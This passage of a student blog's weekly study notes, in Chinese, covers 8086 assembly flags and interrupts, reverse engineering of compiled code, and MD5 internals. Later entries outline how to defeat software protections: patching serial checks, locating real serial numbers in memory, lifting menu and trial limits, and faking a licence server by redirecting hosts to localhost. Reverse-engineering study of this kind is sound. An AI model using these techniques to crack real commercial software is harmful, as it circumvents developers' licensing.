<p><img src="https://s2.ax1x.com/2020/02/12/1bafdf.png" alt="flag寄存器各位示意图 "></p>
<p>flag的1、3、5、12、13、14、15位在8086CPU中没有使用，其他位都有特殊含义</p>
<p>影响标志寄存器的大都是运算指令，没有影响的大都是传送指令</p>
<h3 id="ZF标志">ZF标志</h3>
<p>零标志位<br>
记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure>
<p>执行后zf=1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure>
<p>执行后zf=0</p>
<h3 id="PF标志">PF标志</h3>
<p>奇偶标志位<br>
记录相关指令执行后结果的所有bit位中 1 的个数是否为偶数，如果为偶数PF=1，如果不为偶数PF=0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,1(10)</span><br><span class="line">add al,10(10)</span><br></pre></td></tr></table></figure>
<p>结果为00001011B，∴PF=0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">or al,2</span><br></pre></td></tr></table></figure>
<p>结果为00000011B，∴PF=1</p>
<h3 id="SF标志">SF标志</h3>
<p>符号标志位<br>
记录相关指令执行后结果是否为负，如果负sf=1，如果非负sf=0</p>
<p>计算机中通常用补码表示有符号数据，一个数据可以看作是 有符号数，也可以看成无符号数。<strong>不管如何看待，CPU在执行指令的时候就已经包含了两种含义，也将得到两种结果，关键在于程序需要哪种结果</strong><br>
sf标志是对于有符号数运算的一种记录，记录了数据的正负<br>
将数据<strong>当作有符号数运算时，可以通过 sf 知道结果的正负</strong><br>
将数据<strong>当作无符号数运算时， sf 值无意义，虽然相关指令影响了它的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure>
<p>结果为10000010，sf=1，表示：如果指令进行的是有符号数的运算，那么结果为负。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,01111111B</span><br></pre></td></tr></table></figure>
<p>结果为0，sf=0，表示如果指令进行的是有符号数运算，那么结果为非负。</p>
<p><strong>单纯地考查sf的值不能知道结果的正负，因为sf记录的只是可以在计算机中存放的相应位数的结果的正负(如果发生溢出)</strong></p>
<h3 id="CF标志">CF标志</h3>
<p>进位标志位<br>
进行<strong>无符号数</strong>运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值</p>
<p>对于位数为N的无符号数来说，N-1位为它的<em>最高有效位</em>，假想存在的第N位就是相对于最高有效位的更高位</p>
<p>当两个数据相加的时候，可能产生从最高有效位向更高位的进位。CPU不丢弃这个高位进位值，而是保存在CF上</p>
<h3 id="OF标志">OF标志</h3>
<p>溢出标志位<br>
在进行<strong>有符号数</strong>运算时，如果结果超过了机器能表达的范围称为溢出<br>
记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0</p>
<p><strong>CF是对无符号数运算有意义的标志位，OF是对有符号数运算有意义的标志位。</strong><br>
<strong>对于无符号数运算，CPU用CF来记录是否产生进位；对于有符号数，CPU用OF来记录是否产生溢出,还要用SF来记录结果的符号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,98</span><br><span class="line">add al,99</span><br></pre></td></tr></table></figure>
<p>执行后 CF=0，OF=1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,0f0H</span><br><span class="line">add al,78H</span><br></pre></td></tr></table></figure>
<p>执行后CF=1，OF=0</p>
<h3 id="adc指令">adc指令</h3>
<p>带进位加法指令，利用了CF位上记录的进位值<br>
格式：adc 操作对象1，操作对象2<br>
操作对象1=操作对象1+操作对象2+CF<br>
比add指令多加了一个CF位的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add ax,bx</span><br><span class="line">==</span><br><span class="line">add al,bl</span><br><span class="line">adc ah,bh</span><br></pre></td></tr></table></figure>
<p>adc指令执行后也可能产生进位值，所以也会对CF位进行设置<br>
add指令和adc指令配合 可以对更大的数据进行加法运算</p>
<p>例：<br>
计算1EF0001000H+2010001EF0H,结果放在ax，bx，cx中</p>
<p>1.将低16位相加，CF中记录相加的进位值<br>
2.将次高16位和CF相加，CF中记录相加的进位值<br>
3.高16位和CF相加，CF中记录相加的进位值</p>
<h3 id="sbb指令">sbb指令</h3>
<p>带借位减法指令，利用了CF位上的借位值<br>
格式：sbb 操作对象1，操作对象2<br>
功能：操作对象1=操作对象1-操作对象2-CF<br>
可以对任意大的数据进行减法运算，思路同adc指令</p>
<h3 id="cmp指令">cmp指令</h3>
<p>比较指令，功能相当于减法指令，只是不保存结果，仅仅根据计算结果对标志寄存器进行设置<br>
格式：cmp 操作对象1，操作对象2<br>
cmp可以对无符号数进行比较，也可以对有符号数进行比较<br>
通过cmp指令执行后，相关标志位的值可以看出比较的结果：</p>
<p>进行无符号数比较时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure>
<p>如果(ax)=(bx)则(ax)-(bx)=0，所以zf=1<br>
如果(ax)!=(bx)则(ax)-(bx)!=0，所以zf=0<br>
如果(ax)&lt;(bx)则(ax)-(bx)将产生借位，所以cf=1<br>
如果(ax)&gt;=(bx)则(ax)-(bx)将不必借位，所以cf=0<br>
如果(ax)&gt;(bx)则(ax)-(bx)=0不必借位且结果不为0，所以cf=0，zf=0<br>
如果(ax)&lt;=(bx)则(ax)-(bx)=0可能借位，结果可能为0，所以cf=1或zf=1</p>
<p>进行有符号数比较时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp ah,bh</span><br></pre></td></tr></table></figure>
<p>如果(ah)=(bh)则(ah)-(bh)=0，所以zf=1<br>
如果(ah)!=(bh)则(ah)-(bh)!=0，所以zf=0</p>
<p>如果sf=1，of=0，(ah)&lt;(bh)<br>
如果sf=1，of=1，(ah)&gt;(bh)<br>
如果sf=0，of=1，(ah)&lt;(bh)<br>
如果sf=0，of=0，(ah)&gt;=(bh)</p>
<p>of=0，说明没有溢出，逻辑上真正结果的正负=实际结果的正负<br>
如果因为溢出导致了实际结果为负(正)，那么逻辑上真正的结果必然为正(负)</p>
<p>*zf：记录结果是否为0。如果为0那么ZF=1，如果不为0那么ZF=0<br>
*cf：记录了无符号数运算结果的最高有效位向更高位的进位值<br>
*of：记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0。 OF=0,说明逻辑上真正结果的正负=实际结果的正负<br>
*sf： 记录相关指令执行后结果是否为负，如果负sf=1，如果非负sf=0<br>
*pf：记录相关指令执行后结果的所有bit位中 1 的个数是否为偶数，如果为偶数PF=1，如果不为偶数PF=0</p>
<h2 id="检测比较结果的条件转移指令">检测比较结果的条件转移指令</h2>
<p>与call和ret类似，通常和cmp配合使用<br>
检测被cmp影响的，表示比较结果的标志位</p>
<p>根据<strong>无符号数</strong>的比较结果进行转移的条件转移指令检测zf、cf：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令            含义                检测标志位</span><br><span class="line">je             等于则转移            zf=1      </span><br><span class="line">jne          不等于则转移            zf=0                    </span><br><span class="line">jb             低于则转移            cf=1</span><br><span class="line">jnb          不低于则转移            cf=0                   </span><br><span class="line">ja             高于则转移            cf=0&amp;&amp;zf=0     </span><br><span class="line">jna          不高于则转移            cf=1||zf=1 </span><br></pre></td></tr></table></figure>
<p>根据<strong>有符号数</strong>的比较结果进行转移的条件转移指令检测sf、of、zf</p>
<h2 id="DF标志和串传送指令">DF标志和串传送指令</h2>
<p>DF：方向标志位，在串传送指令中，控制每次操作后si、di的增减<br>
df=0，每次操作后si、di递增<br>
df=1，每次操作后si、di递减</p>
<ol>
<li>
<p>movsb<br>
功能：将ds：si指向的内存单元中的<em>字节</em>送入es：di中，然后根据标志寄存器df位的值将si和di递增或递减</p>
</li>
<li>
<p>movsw<br>
功能：将ds：si指向的内存单元中的<em>字</em>送入es：di中，然后根据标志寄存器df位的值将si和di递增2或递减2</p>
</li>
</ol>
<p>一般来说，movsb和movsw都和rep配合使用<br>
格式： rep movsb<br>
功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:movsb</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure>
<p>对df位进行设置的指令：<br>
cld指令：将df位置0<br>
std指令：将df位置1</p>
<p>使用串传送指令进行数据的传送，需要：</p>
<ol>
<li>传送的原始位置：ds：si</li>
<li>传送的目的位置：es：di</li>
<li>传送的长度：cx</li>
<li>传送的方向：df  (正向/反向传送，si、di递增/递减)</li>
</ol>
<h3 id="pushf和popf">pushf和popf</h3>
<p>pushf是将标志寄存器的值压栈<br>
popf是从栈中弹出数据送入标志寄存器中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0 ;ax清零</span><br><span class="line">push ax ;ax入栈</span><br><span class="line">popf ;把栈中数据弹出到PSW。至此，PSW已经被全置为: 0000 0000 0000 0000 B</span><br><span class="line"></span><br><span class="line">mov ax,0fff0h</span><br><span class="line">add ax,0010h</span><br><span class="line"></span><br><span class="line">CF：假设这是无符号运算：FFF0h+0010h = 1111 1111 1111 0000b + 0000 0000 0001 0000b</span><br><span class="line">=(进位1)0000 0000 0000 0000b，产生进位1，CF标志 = 1。</span><br><span class="line"></span><br><span class="line">OF：假设这是有符号运算：FFF0h此处为补码形式，(FFF0h)原 = 1000 0000 0001 0000b。FFF0h+0010h=0，OF标志 = 0</span><br><span class="line"></span><br><span class="line">pushf</span><br><span class="line">pop ax</span><br><span class="line">这两句把 ax的值设置为：(0000 00** 010* 0101)b</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p><em>tips</em>:</p>
<p><strong>正加正得负，或负加负得正，肯定溢出</strong></p>
<p><strong>一个正数和一个负数相加不可能溢出</strong></p>
<h2 id="内中断">内中断</h2>
<p>任何一个cpu都可以在执行完当前正在执行的指令后，检测到从cpu外部发送来的或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理，这种信息称为<strong>中断信息</strong>。</p>
<h3 id="内中断的产生">内中断的产生</h3>
<p>cpu内部有4种情况可以产生需要及时处理的中断信息<br>
处理中断信息首先要知道接收到的信息的来源，所以中断信息中必须包含识别来源的编码。8086cpu用中断类型码来标识中断信息的来源<br>
中断类型码为一个字节型数据，即可以表示256种中断信息的来源（简称中断源）</p>
<ol>
<li>除法错误，如执行div指令产生的除法溢出 中断类型码：0</li>
<li>单步执行 中断类型码：1</li>
<li>执行into指令 中断类型码：4</li>
<li>执行int 指令 指令格式为int n,n为字节型立即数,中断类型码：n</li>
</ol>
<h3 id="中断向量表">中断向量表</h3>
<p>中断处理程序入口地址的列表<br>
cpu用8位的终端类型码，通过中断向量表，找到相应的中断处理程序的入口地址<br>
中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口<br>
cpu知道了中断类型码就可以将中断类型码作为中断向量表的表项号，定位相应的表项，从而得到程序的入口地址<br>
如果使用8086cpu，中断向量表就必须存放在0000：0000~0000：03FF中，一个表项占两个字，高地址存放段地址，低地址字存放偏移地址</p>
<h2 id=""></h2>
<p>*一个字节：8位<br>
*一个字==两个字节</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.16-2020.03.22</title>
    <url>/dcd92ddb.html</url>
    <content><![CDATA[<h1>32位软件逆向技术</h1>
<h2 id="数据结构">数据结构</h2>
<p>计算机存储、组织数据的方式。确定数据结构后，算法就很容易得到，有时候也根据特定算法来判断数据结构</p>
<h3 id="局部变量">局部变量</h3>
<p>局部变量分配空间时通常会使用栈和寄存器</p>
<span id="more"></span>
<h4 id="利用栈存放局部变量">利用栈存放局部变量</h4>
<p>变量分配与清除的形式：</p>
<ol>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub esp,n</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">add esp,n</span><br></pre></td></tr></table></figure>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp,-n</span><br><span class="line">...用[ebp+xxxx]寻址</span><br><span class="line">sub esp,-n</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>(省空间)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push reg  ;(相当于sub esp，4)</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">pop reg</span><br></pre></td></tr></table></figure>
<p>局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据，因此需要进行初始化，一种方法是通过mov指令，另一种是用push，如：“push 5”</p>
<h4 id="利用寄存器存放局部变量">利用寄存器存放局部变量</h4>
<p>除了栈占用2个寄存器，编译器会利用其他6个通用寄存器尽可能的存放局部变量，如果寄存器不够用会存到栈中</p>
<h3 id="全局变量">全局变量</h3>
<p>全集变量通常位于.data区块的一个固定地址处，访问时一般会用一个固定的硬编码地址直接对内存进行寻址（←使用这种方式比较容易识别出这是一个全局变量。）<br>
一般编译器会将<em>全局变量</em>放到<em>可读</em>写的区块里，如果放到<em>只读</em>区块里就是一个<em>常量</em></p>
<h3 id="数组">数组</h3>
<p>访问一般时通过基址加变址寻址实现的（基址可以是常量也可以是寄存器）</p>
<h2 id="虚函数">虚函数</h2>
<p>虚函数是在程序运行时定义的函数。（c++）<br>
虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的引用通常放在一个专用数组-虚函数表（virtual table）中，数组中的元素存放的就是类中数表的地址。</p>
<blockquote>
<p>虚函数 是在基类中使用关键字 virtual 声明的函数。在派生类中重新定义基类中定义的虚函数时，<em>会告诉编译器不要静态链接到该函数</em>。<br>
基类：当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类，新建的类称为派生类。<br>
继承：代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物，因此，狗是动物，等等。(<span class="exturl" data-url="aHR0cDovL3J1bm9vYi5jb20=">runoob.com<i class="fa fa-external-link-alt"></i></span>)</p>
</blockquote>
<p>程序通过两次寻址得到虚函数的地址然后执行</p>
<h2 id="控制语句">控制语句</h2>
<h3 id="if-else">if-else</h3>
<p>通常为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp a,b</span><br><span class="line">jz/jnz(相当于je/jne) xxxx</span><br></pre></td></tr></table></figure>
<p>整数用cmp指令比较，浮点值用fcom、fcomp等指令比较<br>
许多情况下，编译器用test或or之类的较短的逻辑指令来替换cmp指令<br>
<img src="https://s1.ax1x.com/2020/03/19/8ssrPP.md.png" alt=" "></p>
<h3 id="switch-case">switch-case</h3>
<p>编译器会编译出一组由不同关系运算组成的语句</p>
<p>如果编译时设置优化选项为“Maximize Speed”，编译器会用&quot;dec eax&quot;代替cmp指令。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ecx</span><br><span class="line">lea eax,[esp]</span><br><span class="line">push eax</span><br><span class="line">push 0040804c</span><br><span class="line">call 004010A1   ;scanf</span><br><span class="line">mov eax,[esp+8] ;将输入的值传给eax</span><br><span class="line">add esp,00000008</span><br><span class="line"></span><br><span class="line">dec dax         ;检查eax是否为1h</span><br><span class="line">je 00401055</span><br><span class="line">                ;zf记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</span><br><span class="line">                ;je:等于则转移(检测zf=1) </span><br><span class="line"></span><br><span class="line">(同理也可使用sub eax,xxxxxx判断是否为其他值)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="转移指令机器码的计算">转移指令机器码的计算</h3>
<p>短转移：无条件和有条件的<em>机器码均为2字节</em>，范围为-128~127（2^8）<br>
长转移：无条件的机器码为<u>5字节</u>，条件转移为<u>6字节</u>。因为无条件用一个字节（jmp）表示转移类型；条件转移用2个字节（如je、jns），用其他四个字节表示偏移量<br>
子程序调用指令：调用的参数不涉及寄存器、栈等值的类似于长转移；涉及的例如“call dword ptr [eax+2]”  比较复杂，不表（…）<br>
条件转移指令的范围是16位遗留下的。<br>
cpu开发人员只给目的地址分配了1字节（8位），将跳转的长度限制在225字节之内</p>
<p>无条件短转移的机器码形式为:“EBxx”。B00H~EB4F是向后转移，EB80~EBFFH是向前转移</p>
<p>转移指令的机器码形式为：<br>
位移量=目的地址-起始地址-跳转指令本身长度<br>
转移指令机器码=转移类别机器码(如前文中的EB）+位移量</p>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%B9%E6%8D%AE%E4%BD%8D%E7%A7%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A7%BB%E7%9A%84%E6%84%8F%E4%B9%89">https://brubbish.github.io/34199.html#根据位移进行转移的意义</a></p>
</blockquote>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFC6O.png" alt="jmp 401005对应机器码EB03"></p>
<h1>python爬虫学习</h1>
<p>记录的有点乱，还没整理好<br>
学习的原因是 看了某个论坛上一个学了几周爬虫 后用其爬的结果回答的答主 遂感牛逼，再加上有时候想学点别的作为调节（🤦‍）<br>
<a href="https://brubbish.github.io/710f8e5f.html">https://brubbish.github.io/710f8e5f.html</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.06-2020.04.12</title>
    <url>/51835.html</url>
    <content><![CDATA[<h1>菜单功能限制</h1>
<h2 id="相关函数">相关函数</h2>
<p>要将软件菜单和窗口变得不可用，可用以下函数</p>
<ol>
<li>EnableMenultem()<br>
允许或进制指定的菜单条目<br>
参数：菜单句柄、目标菜单条目的标识符、控制标志（允许、灰化、禁止等）<br>
返回值：返回菜单以前的状态</li>
<li>EnableWindow()<br>
允许或禁止指定窗口<br>
参数：窗口句柄、true/false<br>
返回值：0表示失败，非0表示成功</li>
</ol>
<span id="more"></span>
<h2 id="拆解菜单限制保护">拆解菜单限制保护</h2>
<p>修改控制标志或true/false</p>
<h1>KeyFile保护</h1>
<p>付费后将作者提供的注册文件keyfile放到指定目录下可用让软件成为正版<br>
软件每次启动时都会读取该文件，然后利用某种算法进行处理，以此判断结果是否正确</p>
<h2 id="相关api函数">相关api函数</h2>
<table>
<thead>
<tr>
<th>api函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>FindFirstA</td>
<td>确定文件是否存在</td>
</tr>
<tr>
<td>CreateFileA、_lopen</td>
<td>确定文件是否存在；打开文件获得其句柄</td>
</tr>
<tr>
<td>GetFileSizeA、GetFileEx</td>
<td>获得文件的大小</td>
</tr>
<tr>
<td>GetFileSize、GetFileAttributesExA</td>
<td>获得文件的属性</td>
</tr>
<tr>
<td>SetFilePointer、GetFilePointerEx</td>
<td>移动文件指针</td>
</tr>
<tr>
<td>ReadFile</td>
<td>读取文件内容</td>
</tr>
</tbody>
</table>
<h1>网络验证</h1>
<p>思路是拦截服务器返回的数据包，分析程序是如何处理数据包的</p>
<h2 id="相关函数-2">相关函数</h2>
<p>常用的有send()、recv()【这两个是socket（套接字，计算机之间进行通信的一种约定或一种方式）函数】、WSASend()、WSARecv()等</p>
<h2 id="破解网络验证的一般思路">破解网络验证的一般思路</h2>
<p>如果验证的数据包内容固定，可以抓取数据包，写一个本地服务端模拟服务器<br>
如果不固定则需要找出相应的算法</p>
<ol>
<li>分析发送的数据包<br>
在od中对send()之类的函数设断，分析加密的位置和方式</li>
<li>分析接收的数据包<br>
客户端程序使用recv()之类的函数接收数据，然后进行解密。对解密后数据存放的地址下内存读断点</li>
<li>解除网络验证<br>
编写一个服务端，模拟服务器来接收和发送数据<br>
如果软件用域名登陆服务器，可以修改hosts，使域名指向本地<br>
如果软件用ip地址连接服务器，可以用inet_addr或connect等设断，将ip地址修改为本地ip地址，或用代理软件将ip地址指向本地</li>
</ol>
<p>网络验证的关键是数据包分析</p>
<h1>常用断点设置</h1>
<p><img src="https://s1.ax1x.com/2020/04/09/GInJdU.png" alt=" "></p>
<h1>加密算法</h1>
<h2 id="单向散列算法">单向散列算法</h2>
<p>即hash算法，是将任意长度的消息压缩到某一固定长度的函数（不可逆）<br>
因为是不可逆算法，只能使用hash函数作为加密的一个中间步骤。如，对用户名进行hash变换，再用这个结果进行可逆的加密变换，生成注册码</p>
<h3 id="MD5算法">MD5算法</h3>
<p>MD5消息摘要算法<br>
对任意长度的消息进行运算，产生128位的消息摘要</p>
<h4 id="算法原理">算法原理</h4>
<ol>
<li>数据填充<br>
填充消息，使消息长度（bit）对512求余的结果等于448【比512的倍数小64位】（本身满足了也要）。方法是：附一个1在后面，然后用0来填充。</li>
<li>添加长度<br>
在结尾用64位记录原文长度，最终消息长度是512的整数倍</li>
<li>初始化变量<br>
MD5的结果按32位一组分成4组，由4个寄存器（A、B、C、D）进行演变得到<br>
寄存器初始值为：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原本应为：</span><br><span class="line">A=0x01234567</span><br><span class="line">B=0x89ABCDEF</span><br><span class="line">C=0xFEDCBA98</span><br><span class="line">D=0x76543210</span><br><span class="line">为了在内存中也长那样↑，所以要调整成：</span><br><span class="line">A = 0x67452301;</span><br><span class="line">B = 0xEFCDAB89;</span><br><span class="line">C = 0x98BADCFE;</span><br><span class="line">D = 0x10325476;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>数据处理<br>
4个辅助函数：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X, Y, Z) =(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(X, Y, Z) =(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(X, Y, Z) =X^Y^Z</span><br><span class="line">I(X, Y, Z)=Y^(X|(~Z))</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/04/09/GInbFg.png" alt="流程"><br>
将ABCD的副本abcd中的3个经过运算后与第四个相加，再加上两个常数，并将所得的值<strong>循环左移</strong>s位，最后将所得结果加上abcd之一，回送至ABCD（一次子循环）</p>
<ul>
<li>执行的函数和次数：<br>
先执行16次F,再执行16次G…共64次（每次主循环）<br>
主循环次数：原文长度/512（全部消息）</li>
<li>相加的两个常数：<br>
一个是<strong>利用第2步的原文</strong>，将其等分成16份（每份长度为32位），循环使用其中一份。<br>
另一个是4^32*abs(sin(i))得到的整数部分,在第i步中，i用弧度表示。目的是用正弦函数和幂函数消除变换中的线性</li>
<li>循环左移位数s：有个表<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmJmj.png" alt=" "></li>
</ul>
<ol start="5">
<li>输出</li>
</ol>
<h4 id="分析">分析</h4>
<p>用peid插件krypto analyzer分析，得知程序含有md5的迭代常数，可以猜测使用了md5算法<br>
输入的注册码后进行长度等的判断以及数据初步处理：<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmt7n.png" alt=""><br>
上图call的地址里的代码，通过mov的4个数判断在进行md5初始化：<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmY0s.png" alt="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法" title="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法"></p>
<h3 id="SHA算法">SHA算法</h3>
<p>只看了一点，就放到下周的周报上了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.30-2020.04.05</title>
    <url>/20849.html</url>
    <content><![CDATA[<h1>关于上周博客炸了的问题</h1>
<p>原因是两个_config.yml（可能还有其他文件吧）里所有缩进都不见了…不知道是为啥，就甩给 vscode 和格式化代码插件吧（…)<br>
然后，原来 .yml 要用缩进表示层级啊…<br>
嗯顺便换了个主题</p>
<h1>64 位软件逆向技术</h1>
<h2 id="虚函数">虚函数</h2>
<p>c++的三大核心机制是封装、继承、多态，虚函数是多态的一种体现。在逆向过程中，虚函数是一种还原面向对象代码的重要手段</p>
<h3 id="虚表">虚表</h3>
<p>不同的类虚表不同，相同的类对象共享一个虚表<br>
（以下讲的是用 c++写的程序）<br>
在构造函数中，首先初始化虚表指针，然后初始化数据成员，最后返回 this 指针</p>
<span id="more"></span>
<p>c++语法规定，析构函数需要调用虚函数的无多态性，因此析构函数首先需要赋值虚表<br>
构造函数和析构函数特征一致，可根据调用的先后顺序确定<br>
虚表地址在全局数据区中</p>
<h1>序列号（注册码）保护方式</h1>
<h2 id="序列号保护机制">序列号保护机制</h2>
<p>验证用户名和序列号之间的映射关系（…也有可能没有关系）<br>
检查方法：</p>
<ol>
<li>将用户名等信息通过变换后得到注册码<br>
序列号=F（用户名）<br>
这个方法计算出的序列号以明文形式在内存中出现<br>
也可通过修改比较指令的方法通过检查<br>
再现了生成注册码的过程，不安全</li>
<li>通过注册码验证用户名<br>
生成注册码时：序列号=F（用户名），检查注册码时：用户名=F^（-1）（序列号）<br>
生成注册码的函数和注册码明文未出现在软件代码中<br>
破解可考虑：1.修改比较指令，2.通过 F^(-1)找出 F</li>
<li>通过对等函数检查<br>
F1（用户名）=F2（序列号）<br>
与 2 类似</li>
<li>同时将用户名和序列号作为自变量<br>
特定值=F（用户名，序列号）<br>
可能失去了用户名和序列号的一一对应关系</li>
</ol>
<h2 id="攻击序列号保护机制">攻击序列号保护机制</h2>
<p>找到序列号或修改判断序列号后的跳转指令<br>
跟踪程序启动时（需要将注册码读出并判断）或输入注册码，对 api 设置断点<br>
常用：</p>
<ol>
<li>
<p>将输入的内容复制到缓冲区： GetWindowTextA(W)、GetDlgItemTextA(W)、GetDlgItemInt</p>
</li>
<li>
<p>判断后显示的对话框：MessageBoxA(W)、MessageBoxExA(W)、ShowWindow、MessageBoxIndirectA(W)、CreateDialogParamA(W)、CreateDialogIndirectParamA(w)、DialogBoxParamA(W)、DialogBoxIndirectParamA(W)</p>
</li>
<li>
<p>启动时读取注册码：<br>
RegQueryValueExA(W)(序列号放在注册表);<br>
GetPrivateProfileStringA(W)、GetPrivateProfileIntA(W)、GetProfileIntA(W)、GetProfileStringA(W)(序列号放在 INI 文件中);<br>
CreateFileA(W)、_lopen()(放在一般文件)</p>
</li>
</ol>
<h3 id="数据约束性">数据约束性</h3>
<p>只用在明文比较注册码的保护方式中使用。大多数情况下，真正的注册码会在某个时刻出现在内存中，一般会在用户输入的 ±90h。<br>
例如，用 od 按’Alt+M’打开内存窗口，'Ctrl+B’打开搜索框，搜索输入的序列号，可在附近查找到真序列号</p>
<h3 id="利用消息断点">利用消息断点</h3>
<p>按下和释放鼠标时会发送 WM_LBUTTONDOWN 和 WM_LUBTTONUP 消息，用这个消息下断点可以找到按钮的事件代码</p>
<h3 id="利用提示信息">利用提示信息</h3>
<p>当输入错时提示“序列号错误，再来一次”等，可以查找相应的字符串，定位到相关代码<br>
如 od 中，右键“search for”-&gt;“all referenced text string”</p>
<h2 id="字符串比较形式">字符串比较形式</h2>
<ol>
<li>寄存器直接比较</li>
<li>函数比较<br>
比较内容放在寄存器或栈中<br>
call 一个用于比较的函数，可能是 api 函数或自己写的</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call ....</span><br><span class="line">test eax,eax</span><br><span class="line">jz   ....      ;zf=1-&gt;eax=0 跳转</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>串比较</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea edi [   ] ;edi指向字符串a</span><br><span class="line">lea esi [   ] ;....</span><br><span class="line">repz cmpsd    ;比较</span><br></pre></td></tr></table></figure>
<p>edi、esi：变址寄存器，存放存储单元在段内的偏移量。<br>
rep：按 ecx 中指定次数或在 zf 不满足条件前重复。<br>
如果 ds:si 和 es:di 所指向的两个字节相等，则继续比较。REP（重复）、REPE（相等时重复）、REPNE（不相等时重复）、REPZ（为零时重复）及 REPNZ（不为零时重复）<br>
<img src="https://s1.ax1x.com/2020/04/02/GGvR3D.png" alt=" "><br>
CMPSB 比较字节 CMPSW 比较字 CMPSD 比较双字 ,方向标志位决定 ESI 和 EDI 的增加或减少</p>
<h1>警告窗口</h1>
<p>常用的方法是修改程序的资源、静态分析、动态分析<br>
显示窗口的常用函数有 MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)等，对某些警告窗口无效时可以尝试利用消息设置断点拦截</p>
<h1>时间限制</h1>
<h2 id="计时器">计时器</h2>
<p>对于限制每次运行时长的软件</p>
<ol>
<li>setTimer 函数<br>
应用程序在初始化时调用这个 api 函数，申请计时器并设定时间间隔，同时获得一个处理计时器超时的回调函数。若超时，系统会向申请的窗口发送 WM_TIMER 或调用那个回调函数。当程序不需要计时器，调用 KillTimer()进行销毁</li>
<li>高精度多媒体计时器<br>
调用 timeSetEvent()</li>
<li>其它<br>
timeGetTime()、GetTickCount()，返回的都是系统启动以来经历过的时间，函数的精度取决于系统的设置；也可以利用各高级语言开发库里的函数实现计时，如 c 语言里的 time()（返回 1970.01.01 0 时起至今的秒数）</li>
</ol>
<p>精度太高会对系统性能造成影响，故一般不需要太高精度。</p>
<h2 id="时间限制">时间限制</h2>
<p>试用期<br>
在安装软件或主程序第一次运行时获得系统日期并记录。程序每次运行都要去的当前系统日期并与之前的记录比较<br>
软件一般最少要保存两个时间值，一个是安装（运行）日期（最好存在多个地方），一个是软件最近一次运行的日期（防止用户修改机器日期）<br>
